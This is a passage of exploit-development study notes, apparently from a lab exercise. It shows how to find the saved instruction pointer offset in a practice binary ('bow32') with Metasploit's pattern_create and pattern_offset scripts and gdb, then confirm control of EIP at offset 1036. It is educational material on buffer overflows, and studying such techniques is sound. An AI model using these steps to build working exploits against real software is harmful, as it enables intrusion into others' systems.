
#### Check position of saved instruction pointer on stack

The next step is to change the value of the instruction pointer. This cannot be done directly, as it is read only, but the old value of the instruction pointer is saved on the stack when a function is called. This is where it can possibly be overwritten.

We want to see what part of the input we gave ends up where in memory. You can make a string to test with manually or use a tool.

Metasploit has two helpful scripts. One to generate a non-repetitive string and one to give us the offset (position) of a part of this string.

`/usr/share/metasploit-framework/tools/exploit/pattern-create.rb`
	`-l`, `--length <length>`         The length of the pattern
    `-s`, `--sets <ABC,def,123>`   Custom Pattern Sets
    `-h`, `--help`                             Show help
	`./pattern_create.rb -l 500` Creates a non-repetitive string with length 500

`/usr/share/metasploit-framework/tools/exploit/pattern-offset.rb`
    `-q`, `--query Aa0A`                 Query to Locate
    `-l`, `--length <length>`        The length of the pattern
    `-s`, `--sets <ABC,def,123>`  Custom Pattern Sets
    `-h`, `--help`                            Show help
	`./pattern_offset -l 500 -q 63413163` Returns the position of the 0x63413163`

Example:
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
gdb -q bow32
run $(cat pattern.txt)
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()

/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569        
[*] Exact match at offset 1036
```

Test that the position is correct:
```sh
gdb -q bow32
run $(python -c "print('\x55' * 1036 + '\x66' * 4)")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

Yay, we can set eip!

Remember this number for later!


